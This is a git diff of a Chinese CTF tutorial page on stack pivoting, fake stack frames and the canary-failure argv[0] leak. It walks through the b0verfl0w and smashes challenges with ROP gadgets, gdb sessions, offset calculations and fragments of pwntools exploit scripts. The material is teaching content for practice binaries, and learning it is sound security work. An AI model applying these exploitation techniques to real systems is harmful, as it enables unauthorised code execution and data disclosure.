@@ -1,10 +1,10 @@
-#  其它栈溢出技巧
+#  花式栈溢出技巧
 
-# stack privot
+## stack privot
 
-## 原理
+### 原理
 
-stack privot，正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处。然后再在相应的位置进行ROP。一般来说，我们可能在以下情况需要使用stack privot
+stack privot，正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行ROP。一般来说，我们可能在以下情况需要使用stack privot
 
 - 可以控制的栈溢出的字节数较少，难以构造较长的ROP链
 - 开启了PIE保护，栈地址未知，我们可以将栈劫持到已知的区域。
@@ -16,28 +16,28 @@ stack privot，正如它所描述的，该技巧就是劫持栈指针指向攻�
 
 - 可以控制sp指针。一般来说，控制栈指针会使用ROP，常见的控制栈指针的gadgets一般是
 
-  ```assembly
-  pop rsp/esp
-  ```
+```asm
+pop rsp/esp
+```
 
   当然，还会有一些其它的姿势。比如说libc_csu_init中的gadgets，我们通过偏移就可以得到控制rsp指针。上面的是正常的，下面的是偏移的。
 
-  ```assembly
-  gef➤  x/7i 0x000000000040061a
-     0x40061a <__libc_csu_init+90>:	pop    rbx
-     0x40061b <__libc_csu_init+91>:	pop    rbp
-     0x40061c <__libc_csu_init+92>:	pop    r12
-     0x40061e <__libc_csu_init+94>:	pop    r13
-     0x400620 <__libc_csu_init+96>:	pop    r14
-     0x400622 <__libc_csu_init+98>:	pop    r15
-     0x400624 <__libc_csu_init+100>:	ret    
-  gef➤  x/7i 0x000000000040061d
-     0x40061d <__libc_csu_init+93>:	pop    rsp
-     0x40061e <__libc_csu_init+94>:	pop    r13
-     0x400620 <__libc_csu_init+96>:	pop    r14
-     0x400622 <__libc_csu_init+98>:	pop    r15
-     0x400624 <__libc_csu_init+100>:	ret
-  ```
+```asm
+gef➤  x/7i 0x000000000040061a
+0x40061a <__libc_csu_init+90>:	pop    rbx
+0x40061b <__libc_csu_init+91>:	pop    rbp
+0x40061c <__libc_csu_init+92>:	pop    r12
+0x40061e <__libc_csu_init+94>:	pop    r13
+0x400620 <__libc_csu_init+96>:	pop    r14
+0x400622 <__libc_csu_init+98>:	pop    r15
+0x400624 <__libc_csu_init+100>:	ret    
+gef➤  x/7i 0x000000000040061d
+0x40061d <__libc_csu_init+93>:	pop    rsp
+0x40061e <__libc_csu_init+94>:	pop    r13
+0x400620 <__libc_csu_init+96>:	pop    r14
+0x400622 <__libc_csu_init+98>:	pop    r15
+0x400624 <__libc_csu_init+100>:	ret
+```
 
   此外，还有更加高级的fake frame。
 
@@ -46,9 +46,9 @@ stack privot，正如它所描述的，该技巧就是劫持栈指针指向攻�
   - bss段。由于进程按页分配内存，分配给bss段的内存大小至少一个页(4k,0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且bss段分配的内存页拥有读写权限。
   - heap。但是这个需要我们能够泄露堆地址。
 
-## 示例
+### 示例
 
-### 例1
+#### 例1
 
 这里我们以**X-CTF Quals 2016 - b0verfl0w**为例，进行介绍。首先，查看程序的安全保护，如下
 
@@ -88,7 +88,7 @@ signed int vul()
 
 第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启ASLR保护，所以我们很难直接知道shellcode的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对esp进行操作，使其指向shellcode处，并且直接控制程序跳转至esp处。那下面就是找控制程序跳转到esp处的gadgets了。
 
-```assembly
+```shell
 ➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ ROPgadget --binary b0verfl0w --only 'jmp|ret'         
 Gadgets information
 ============================================================
@@ -113,7 +113,7 @@ shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp
 
 所以我们最后一段需要执行的指令就是
 
-```assembly
+```asm
 sub 0x28,esp
 jmp esp
 ```
@@ -136,19 +136,19 @@ sh.sendline(payload)
 sh.interactive()
 ```
 
-### 例2-转移堆
+#### 例2-转移堆
 
 待。
 
-## 题目
+### 题目
 
 - EkoPartyCTF 2016 fuckzing-exploit-200
 
-# frame faking
+## frame faking
 
 正如这个技巧名字所说的那样，这个技巧就是构造一个虚假的栈帧来控制程序的执行流。
 
-## 原理
+### 原理
 
 概括地讲，我们在之前讲的栈溢出不外乎两种方式
 
@@ -216,14 +216,14 @@ pop ebp #弹出ebp
 
    - move esp, ebp，将ebp指向当前基地址。
 
-     此时的栈结构如下
+此时的栈结构如下
 
-     ```
-     ebp
-     |
-     v
-     ebp2|leave ret addr|arg1|arg2
-     ```
+```
+ebp
+|
+v
+ebp2|leave ret addr|arg1|arg2
+```
 
 5. 当程序执行师，其会正常申请空间，同时我们在栈上也安排了该函数对应的参数，所以程序会正常执行。
 
@@ -231,11 +231,11 @@ pop ebp #弹出ebp
 
 可以看出在fake frame中，我们有一个需求就是，我们必须得有一块可以写的内存，并且我们还知道这块内存的地址，这一点与stack privot相似。
 
-## 例子
+### 例子
 
 目前来说，我在exploit-exercise的fusion level2中利用过这个技巧，其它地方暂时还未遇到，遇到的时候再进行补充。
 
-## 题目
+### 题
 
 
 
@@ -245,9 +245,9 @@ pop ebp #弹出ebp
 - [http://phrack.org/issues/58/4.html](http://phrack.org/issues/58/4.html)
 
 
-# Stack smash
+## Stack smash
 
-## 原理
+### 原理
 
 在程序加了canary保护之后，如果我们读取的buffer覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而stack smash技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序发现canary保护之后，如果发现canary被修改的话，程序就会执行__stack_chk_fail函数来打印argv[0]指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下
 
@@ -267,11 +267,11 @@ void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *ms
 
 所以说如果我们利用栈溢出覆盖argv[0]为我们想要输出的字符串的地址，那么在__fortify_fail函数中就会输出我们想要的信息。
 
-## 例子
+### 例子
 
 这里，我们以2015年32C3 CTF smashes为例进行介绍，该题目在jarvisoj上有复现。
 
-### 确定保护
+#### 确定保护
 
 可以看出程序为64位，主要开启了Canary保护以及NX保护，以及FORTIFY保护。
 
@@ -285,7 +285,7 @@ void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *ms
     FORTIFY:  Enabled
 ```
 
-### 分析程序
+#### 分析程序
 
 ida看一下
 
@@ -344,11 +344,11 @@ LABEL_8:
 
 - 在EFL内存映射时，bss段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用gdb的find来进行查找。
 
-### 确定flag地址
+#### 确定flag地址
 
 我们把断点下载memset函数处，然后读取相应的内容如下
 
-```shell
+```asm
 gef➤  c
 Continuing.
 Hello!
@@ -399,13 +399,13 @@ gef➤  grep PCTF
 
 可以看出我们读入的2222已经覆盖了0x600d20处的flag，但是我们在内存的0x400d20处仍然找到了这个flag的备份，所以我们还是可以将其输出。这里我们已经确定了flag的地址。
 
-### 确定偏移
+#### 确定偏移
 
 下面，我们确定argv[0]距离读取的字符串的偏移。
 
 首先下断点在main函数入口处，如下
 
-```shell
+```asm
 gef➤  b *0x00000000004006D0
 Breakpoint 1 at 0x4006d0
 gef➤  r
@@ -437,14 +437,13 @@ Breakpoint 1, 0x00000000004006d0 in ?? ()
 ---Type <return> to continue, or q <return> to quit---
 [#2] 0x400717 → hlt 
 
-
 ```
 
 可以看出0x00007fffffffe00b指向程序名，其自然就是argv[0]，所以我们修改的内容就是这个地址。同时0x00007fffffffdc58处保留着该地址，所以我们真正需要的地址是0x00007fffffffdc58。
 
 此外，根据汇编代码
 
-```assembly
+```asm
 .text:00000000004007E0                 push    rbp
 .text:00000000004007E1                 mov     esi, offset aHelloWhatSYour ; "Hello!\nWhat's your name? "
 .text:00000000004007E6                 mov     edi, 1
@@ -460,7 +459,7 @@ Breakpoint 1, 0x00000000004006d0 in ?? ()
 
 我们可以确定我们读入的字符串的起始地址其实就是调用__IO_gets之前的rsp，所以我们把断点下在call处，如下
 
-```assembly
+```asm
 gef➤  b *0x000000000040080E
 Breakpoint 2 at 0x40080e
 gef➤  c
@@ -504,7 +503,7 @@ $1 = (void *) 0x7fffffffda40
 '0x218'
 ```
 
-### 利用程序
+#### 利用程序
 
 我们构造利用程序如下
 
@@ -531,5 +530,5 @@ sh.interactive()
 
 这里我们直接就得到了flag，没有出现网上说的得不到flag的情况。
 
-## 题目
+### 题目
 
